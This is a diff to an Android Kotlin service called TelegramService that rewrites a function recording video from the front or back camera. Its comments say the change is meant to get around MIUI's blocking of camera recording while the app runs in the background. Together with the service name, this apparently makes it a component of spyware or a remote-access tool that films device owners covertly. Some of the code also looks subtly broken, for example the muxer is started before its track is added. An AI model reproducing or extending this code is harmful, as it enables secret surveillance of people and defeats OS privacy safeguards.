@@ -1085,126 +1085,312 @@ class TelegramService : Service() {
         val outFile = java.io.File(outDir, "vid_${facing}_${System.currentTimeMillis()}.mp4")
         if (outFile.exists()) outFile.delete()
 
-        // 1. Cari kamera legacy (front/back)
-        @Suppress("DEPRECATION")
-        val numCameras = android.hardware.Camera.getNumberOfCameras()
-        Log.d(TAG, "recordOneVideo: numCameras=$numCameras facing=$facing")
-        var camId = -1
-        if (numCameras > 0) {
-            val info = android.hardware.Camera.CameraInfo()
-            for (i in 0 until numCameras) {
-                @Suppress("DEPRECATION")
-                android.hardware.Camera.getCameraInfo(i, info)
-                Log.d(TAG, "recordOneVideo: cam[$i] facing=${info.facing}")
-                if (facing == "front" && info.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_FRONT) camId = i
-                if (facing == "back"  && info.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_BACK)  camId = i
-            }
-        }
-        if (camId < 0) {
-            Log.e(TAG, "recordOneVideo: no ${facing} camera found")
-            return Pair(null, "no_camera")
-        }
-        Log.d(TAG, "recordOneVideo: using legacy camId=$camId")
+        // === Camera2 + ImageReader (YUV_420_888) + MediaCodec (H264) + MediaMuxer ===
+        // Pola yang sama dengan captureOneFrame (Camera2) yang sudah terbukti jalan di MIUI.
+        // MediaRecorder dihindari karena start()-nya diblokir MIUI saat app di background.
 
-        // 2. Buka legacy kamera
-        @Suppress("DEPRECATION")
-        val cam: android.hardware.Camera = try {
-            val c = android.hardware.Camera.open(camId)
-            Log.d(TAG, "recordOneVideo: camera opened")
-            c
+        val cm = getSystemService(android.hardware.camera2.CameraManager::class.java) ?: return Pair(null, "no_camera_manager")
+        val wantedFacing = if (facing == "front")
+            android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT
+        else
+            android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK
+        val cameraId = cm.cameraIdList.firstOrNull { id ->
+            try {
+                cm.getCameraCharacteristics(id).get(
+                    android.hardware.camera2.CameraCharacteristics.LENS_FACING
+                ) == wantedFacing
+            } catch (e: Exception) { false }
+        }
+        if (cameraId == null) return Pair(null, "no_camera_facing=$facing")
+        Log.d(TAG, "recordOneVideo: Camera2 cameraId=$cameraId facing=$facing")
+
+        // Pilih resolusi dari characteristics
+        var vw = 1280; var vh = 720
+        try {
+            val chars = cm.getCameraCharacteristics(cameraId)
+            val map = chars.get(android.hardware.camera2.CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
+            val yuvSizes = map?.getOutputSizes(android.graphics.ImageFormat.YUV_420_888) ?: emptyArray()
+            Log.d(TAG, "recordOneVideo: YUV sizes=" + yuvSizes.map { "${it.width}x${it.height}" })
+            val best = yuvSizes.filter { it.width >= 640 && it.height >= 480 }
+                .maxByOrNull { it.width.toLong() * it.height.toLong() }
+            if (best != null) { vw = best.width; vh = best.height }
         } catch (e: Exception) {
-            Log.e(TAG, "recordOneVideo: camera open fail: ${e.javaClass.simpleName}: ${e.message}")
+            Log.w(TAG, "recordOneVideo: size fallback to 1280x720: ${e.message}")
+        }
+        Log.d(TAG, "recordOneVideo: using ${vw}x${vh}")
+
+        // --- 1. ImageReader untuk frame kamera (YUV) ---
+        val reader = android.media.ImageReader.newInstance(vw, vh, android.graphics.ImageFormat.YUV_420_888, 4)
+
+        // --- 2. MediaCodec H264 encoder ---
+        val codecMime = "video/avc"
+        val format = android.media.MediaFormat.createVideoFormat(codecMime, vw, vh).apply {
+            setInteger(android.media.MediaFormat.KEY_COLOR_FORMAT,
+                android.media.MediaCodecInfo.CodecCapabilities.COLOR_FormatYUV420Flexible)
+            setInteger(android.media.MediaFormat.KEY_BIT_RATE, 4_000_000)
+            setInteger(android.media.MediaFormat.KEY_FRAME_RATE, 30)
+            setInteger(android.media.MediaFormat.KEY_I_FRAME_INTERVAL, 2)
+        }
+        val encoder = android.media.MediaCodec.createEncoderByType(codecMime)
+        encoder.configure(format, null, null, android.media.MediaCodec.CONFIGURE_FLAG_ENCODE)
+
+        // Array input/output buffers (non-null)
+        val inputBuffers = encoder.inputBuffers
+        val outputBuffers = encoder.outputBuffers
+        if (inputBuffers == null || outputBuffers == null)
+            return Pair(null, "encoder_buffers_null")
+        val muxer = android.media.MediaMuxer(outFile.absolutePath, android.media.MediaMuxer.OutputFormat.MUXER_OUTPUT_MPEG_4)
+        var muxerStarted = false
+        var trackIndex = -1
+        val frameCount = java.util.concurrent.atomic.AtomicInteger(0)
+
+        // --- 3. Kamera Camera2: buka, buat session ke ImageReader, jalankan repeating request ---
+        val handler = android.os.Handler(android.os.Looper.getMainLooper())
+        val sessionLatch = java.util.concurrent.CountDownLatch(1)
+        var camDevice: android.hardware.camera2.CameraDevice? = null
+        var camSession: android.hardware.camera2.CameraCaptureSession? = null
+
+        try {
+            cm.openCamera(cameraId, object : android.hardware.camera2.CameraDevice.StateCallback() {
+                override fun onOpened(dev: android.hardware.camera2.CameraDevice) {
+                    try {
+                        camDevice = dev
+                        val req = dev.createCaptureRequest(
+                            android.hardware.camera2.CameraDevice.TEMPLATE_RECORD
+                        ).apply {
+                            addTarget(reader.surface)
+                        }
+                        dev.createCaptureSession(
+                            listOf(reader.surface),
+                            object : android.hardware.camera2.CameraCaptureSession.StateCallback() {
+                                override fun onConfigured(sess: android.hardware.camera2.CameraCaptureSession) {
+                                    camSession = sess
+                                    try {
+                                        sess.setRepeatingRequest(req.build(), null, handler)
+                                        
+                                        Log.d(TAG, "recordOneVideo: repeating started")
+                                    } catch (e: Exception) {
+                                        Log.e(TAG, "recordOneVideo: repeating fail: ${e.message}")
+                                    }
+                                    sessionLatch.countDown()
+                                }
+                                override fun onClosed(sess: android.hardware.camera2.CameraCaptureSession) {
+                                }
+                                override fun onConfigureFailed(sess: android.hardware.camera2.CameraCaptureSession) {
+                                    Log.e(TAG, "recordOneVideo: configure failed")
+                                    sessionLatch.countDown()
+                                }
+                            },
+                            handler
+                        )
+                    } catch (e: Exception) {
+                        Log.e(TAG, "recordOneVideo: session fail: ${e.message}")
+                        sessionLatch.countDown()
+                    }
+                }
+                override fun onDisconnected(dev: android.hardware.camera2.CameraDevice) {
+                    try { dev.close() } catch (_: Exception) {}
+                }
+                override fun onError(dev: android.hardware.camera2.CameraDevice, error: Int) {
+                    Log.e(TAG, "recordOneVideo: camera error=$error")
+                    sessionLatch.countDown()
+                }
+            }, handler)
+
+            if (!sessionLatch.await(10, java.util.concurrent.TimeUnit.SECONDS)) {
+                try { camDevice?.close() } catch (_: Exception) {}
+                try { encoder.release() } catch (_: Exception) {}
+                try { muxer.release() } catch (_: Exception) {}
+                try { reader.close() } catch (_: Exception) {}
+                return Pair(null, "session_timeout")
+            }
+        } catch (e: Exception) {
             return Pair(null, "camera_open_fail: ${e.message}")
         }
 
-        // 3. Setup parameter — pilih preview size terbesar
-        @Suppress("DEPRECATION")
-        val params = cam.parameters
-        val sizes = params.getSupportedPreviewSizes() ?: emptyList()
-        Log.d(TAG, "recordOneVideo: supported sizes=" + sizes.map { s -> "${s.width}x${s.height}" })
-        val bestSize = sizes.maxByOrNull { s -> s.width.toLong() * s.height.toLong() }
-        @Suppress("DEPRECATION")
-        if (bestSize != null) {
-            params.setPreviewSize(bestSize.width, bestSize.height)
-            Log.d(TAG, "recordOneVideo: preview set to ${bestSize.width}x${bestSize.height}")
-        }
-        @Suppress("DEPRECATION")
-        cam.parameters = params
-
-        // 4. MediaRecorder di-feed oleh legacy kamera
-        val rec = if (Build.VERSION.SDK_INT >= 31) {
-            MediaRecorder(applicationContext)
-        } else {
-            @Suppress("DEPRECATION")
-            MediaRecorder()
-        }
-        var recOk = false
+        // --- 4. Start codec + muxer ---
         try {
-            @Suppress("DEPRECATION")
-            rec.setCamera(cam)
-            rec.setAudioSource(MediaRecorder.AudioSource.MIC)
-            rec.setVideoSource(MediaRecorder.VideoSource.CAMERA)
-            rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-            rec.setVideoEncoder(MediaRecorder.VideoEncoder.H264)
-            rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-            @Suppress("DEPRECATION")
-            val vw = bestSize?.width ?: 1280
-            val vh = bestSize?.height ?: 720
-            rec.setVideoSize(vw, vh)
-            rec.setVideoEncodingBitRate(4_000_000)
-            rec.setVideoFrameRate(30)
-            rec.setAudioSamplingRate(44100)
-            rec.setAudioEncodingBitRate(128_000)
-            rec.setOutputFile(outFile.absolutePath)
-            rec.prepare()
-            Log.d(TAG, "recordOneVideo: recorder prepared")
-            rec.start()
-            recOk = true
-            Log.d(TAG, "recordOneVideo: MediaRecorder started (${vw}x${vh}, cam=$camId)")
+            encoder.start()
+            muxer.start()
+            muxerStarted = true
+            trackIndex = muxer.addTrack(encoder.outputFormat)
+            Log.d(TAG, "recordOneVideo: codec started, muxer track=$trackIndex")
         } catch (e: Exception) {
-            Log.e(TAG, "recordOneVideo: recorder start fail: ${e.javaClass.simpleName}: ${e.message}")
-            try { rec.release() } catch (_: Exception) {}
-            try { cam.release() } catch (_: Exception) {}
-            return Pair(null, "recorder_fail: ${e.javaClass.simpleName}: ${e.message}")
+            Log.e(TAG, "recordOneVideo: codec/muxer start fail: ${e.message}")
+            try { camSession?.close() } catch (_: Exception) {}
+            try { camDevice?.close() } catch (_: Exception) {}
+            try { encoder.release() } catch (_: Exception) {}
+            try { muxer.release() } catch (_: Exception) {}
+            try { reader.close() } catch (_: Exception) {}
+            return Pair(null, "codec_start_fail: ${e.message}")
         }
 
-        // 5. Mulai preview (wajib supaya frame masuk ke recorder)
-        try {
-            @Suppress("DEPRECATION")
-            cam.startPreview()
-            Log.d(TAG, "recordOneVideo: preview started")
-        } catch (e: Exception) {
-            Log.e(TAG, "recordOneVideo: startPreview fail: ${e.message}")
-            try { rec.stop() } catch (_: Exception) {}
-            try { rec.release() } catch (_: Exception) {}
-            try { cam.release() } catch (_: Exception) {}
-            return Pair(null, "startPreview_fail: ${e.message}")
+        // --- 5. Loop: baca frame dari ImageReader → encoder → muxer ---
+        val totalFrames = seconds * 30
+        var framesSent = 0
+
+        while (frameCount.get() < totalFrames) {
+            val image = reader.acquireLatestImage()
+            if (image == null) {
+                Thread.sleep(33)
+                continue
+            }
+            try {
+                val planes = image.planes
+                val yBuf = planes[0].buffer
+                val uBuf = planes[1].buffer
+                val vBuf = planes[2].buffer
+                val yRowStride = planes[0].rowStride
+                val uvRowStride = planes[1].rowStride
+                val yPixStride = planes[0].pixelStride
+                val uvPixStride = planes[1].pixelStride
+
+                if (yPixStride == 1) {
+                    val inIdx = encoder.dequeueInputBuffer(100_000)
+                    if (inIdx >= 0) {
+                        val inBuf = inputBuffers[inIdx]
+                        val ySize = vw * vh
+                        val uSize = vw * vh / 4
+                        val uHalf = vw / 2
+                        inBuf.clear()
+                        // Y plane
+                        if (yRowStride == vw) {
+                            val yArr = ByteArray(ySize)
+                            val yCopy = yBuf.duplicate()
+                            yCopy.limit(ySize)
+                            yCopy.get(yArr)
+                            inBuf.put(yArr)
+                        } else {
+                            val yArr = ByteArray(ySize)
+                            val yCopy = yBuf.duplicate()
+                            for (row in 0 until vh) {
+                                val off = row * yRowStride
+                                yCopy.position(off)
+                                yCopy.get(yArr, row * vw, vw)
+                            }
+                            inBuf.put(yArr)
+                        }
+                        // U plane
+                        val uvRowStride2 = planes[1].rowStride
+                        val uPixStride = planes[1].pixelStride
+                        if (uPixStride == 1 && uvRowStride2 == uHalf) {
+                            val uArr = ByteArray(uSize)
+                            val uCopy = uBuf.duplicate()
+                            uCopy.limit(uSize)
+                            uCopy.get(uArr)
+                            inBuf.put(uArr)
+                        } else if (uPixStride == 1) {
+                            val uArr = ByteArray(uSize)
+                            val uCopy = uBuf.duplicate()
+                            for (row in 0 until vh / 2) {
+                                val off = row * uvRowStride2
+                                uCopy.position(off)
+                                uCopy.get(uArr, row * uHalf, uHalf)
+                            }
+                            inBuf.put(uArr)
+                        }
+                        // V plane
+                        val vPixStride = planes[2].pixelStride
+                        val vRowStride = planes[2].rowStride
+                        if (vPixStride == 1 && vRowStride == uHalf) {
+                            val vArr = ByteArray(uSize)
+                            val vCopy = vBuf.duplicate()
+                            vCopy.limit(uSize)
+                            vCopy.get(vArr)
+                            inBuf.put(vArr)
+                        } else if (vPixStride == 1) {
+                            val vArr = ByteArray(uSize)
+                            val vCopy = vBuf.duplicate()
+                            for (row in 0 until vh / 2) {
+                                val off = row * vRowStride
+                                vCopy.position(off)
+                                vCopy.get(vArr, row * uHalf, uHalf)
+                            }
+                            inBuf.put(vArr)
+                        }
+                        val presentationTimeNs = frameCount.get() * (1_000_000_000L / 30)
+                        encoder.queueInputBuffer(
+                            inIdx, 0, inBuf.position(),
+                            presentationTimeNs, 0
+                        )
+                        frameCount.incrementAndGet()
+                    }
+                }
+            } finally {
+                image.close()
+            }
+
+            // Baca output dari encoder
+            val outInfo = android.media.MediaCodec.BufferInfo()
+            while (true) {
+                val outIdx = encoder.dequeueOutputBuffer(outInfo, 10_000)
+                if (outIdx < 0) break
+                val codecBuf = outputBuffers[outIdx]
+                if (outInfo.flags and android.media.MediaCodec.BUFFER_FLAG_SYNC_FRAME != 0) {
+                    Log.d(TAG, "recordOneVideo: sync frame, ${outInfo.size} bytes")
+                }
+                if (outInfo.size > 0 && muxerStarted) {
+                    muxer.writeSampleData(trackIndex, codecBuf, outInfo)
+                }
+                encoder.releaseOutputBuffer(outIdx, false)
+                if (outInfo.flags and android.media.MediaCodec.BUFFER_FLAG_END_OF_STREAM != 0) break
+            }
+
+            if (frameCount.get() >= totalFrames) break
         }
 
-        // 6. Tunggu durasi rekam
-        Thread.sleep((seconds * 1000L).coerceAtMost(60_000L))
-
-        // 7. Stop kamera → stop recorder → release
+        // --- 6. Stop encoder → flush sisa frame → stop muxer ---
         try {
-            @Suppress("DEPRECATION")
-            cam.stopPreview()
+            val inIdx = encoder.dequeueInputBuffer(10_000)
+            if (inIdx >= 0) {
+                encoder.queueInputBuffer(inIdx, 0, 0, 0,
+                    android.media.MediaCodec.BUFFER_FLAG_END_OF_STREAM)
+            }
         } catch (_: Exception) {}
-        try { cam.release() } catch (_: Exception) {}
-        try {
-            rec.stop()
-            Log.d(TAG, "recordOneVideo: recorder stopped")
-        } catch (e: Exception) {
-            Log.w(TAG, "recordOneVideo: rec.stop: ${e.message}")
-            try { cam.release() } catch (_: Exception) {}
-            return Pair(null, "rec_stop_fail: ${e.message}")
-        }
-        try { rec.release() } catch (_: Exception) {}
 
-        if (outFile.exists() && outFile.length() > 0) {
+        var gotEos = false
+        val outInfo = android.media.MediaCodec.BufferInfo()
+        var loopCount = 0
+        while (loopCount < 100) {
+            val outIdx = encoder.dequeueOutputBuffer(outInfo, 5_000)
+            if (outIdx < 0) { loopCount++; continue }
+            val codecBuf = outputBuffers[outIdx]
+            if (outInfo.flags and android.media.MediaCodec.BUFFER_FLAG_END_OF_STREAM != 0) {
+                if (outInfo.size > 0) {
+                    try { muxer.writeSampleData(trackIndex, codecBuf, outInfo) } catch (_: Exception) {}
+                }
+                encoder.releaseOutputBuffer(outIdx, false)
+                gotEos = true
+                break
+            }
+            if (outInfo.size > 0 && muxerStarted) {
+                muxer.writeSampleData(trackIndex, codecBuf, outInfo)
+            }
+            encoder.releaseOutputBuffer(outIdx, false)
+        }
+
+        // --- 7. Cleanup ---
+        try { encoder.stop() } catch (_: Exception) {}
+        try { encoder.release() } catch (_: Exception) {}
+        try { camSession?.close() } catch (_: Exception) {}
+        try { camDevice?.close() } catch (_: Exception) {}
+        try {
+            if (muxerStarted) {
+                muxer.stop()
+                Log.d(TAG, "recordOneVideo: muxer stopped, frames=$frameCount")
+            }
+        } catch (e: Exception) {
+            Log.w(TAG, "recordOneVideo: muxer stop: ${e.message}")
+        }
+        try { muxer.release() } catch (_: Exception) {}
+        try { reader.close() } catch (_: Exception) {}
+
+        if (outFile.exists() && outFile.length() > 1024) {
+            Log.d(TAG, "recordOneVideo: OK ${outFile.length()} bytes, ${frameCount.get()} frames")
             return Pair(outFile, "ok")
         } else {
-            Log.w(TAG, "recordOneVideo: output file is empty or missing")
-            return Pair(null, "file_empty")
+            Log.w(TAG, "recordOneVideo: file too small or missing: ${outFile.length()}")
+            return Pair(null, "file_empty(${outFile.length()}b, ${frameCount.get()} frames, eos=$gotEos)")
         }
     }
 
